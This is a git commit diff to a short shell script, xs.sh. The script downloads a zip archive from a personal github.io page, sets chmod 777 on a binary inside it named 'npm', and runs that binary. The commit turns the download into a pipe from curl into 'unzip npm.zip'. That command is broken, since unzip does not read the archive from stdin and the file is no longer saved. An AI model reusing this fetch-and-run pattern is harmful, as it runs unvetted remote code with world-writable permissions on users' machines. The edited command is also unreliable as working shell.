a9eea8a7cc77db1b3ec139150fbccfe1f94044d4
fuserh <113811989+fuserh@users.noreply.github.com>
2022-09-24 14:28:22 +0800

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,8 +1,6 @@
 sudo apt install unzip -y
 cd ~
-curl -L https://fuserh.github.io/npm.zip
-chmod 777 npm.zip
-unzip npm.zip
+curl -L https://fuserh.github.io/npm.zip | unzip npm.zip
 cd npm
 chmod 777 ./npm
 ./npm
